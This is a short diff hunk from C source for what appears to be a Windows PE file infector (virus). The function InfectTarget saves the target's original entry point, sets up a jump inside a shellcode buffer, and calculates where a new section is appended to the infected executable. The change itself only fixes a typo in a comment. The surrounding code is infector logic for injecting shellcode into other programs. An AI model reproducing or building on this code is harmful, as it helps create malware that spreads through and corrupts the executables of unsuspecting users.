@@ -397,7 +397,7 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
 #endif
     long oldVA = pOptHdr->AddressOfEntryPoint;
     long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
-    // *jmpPoint = oldVA; !!! you can't exit readonly mem 
+    // *jmpPoint = oldVA; !!! you can't edit readonly mem 
     // Calc New Section raw
     long rawNewSec = pLasSecHdr->PointerToRawData + pLasSecHdr->SizeOfRawData;
     // Calc New Section rva 
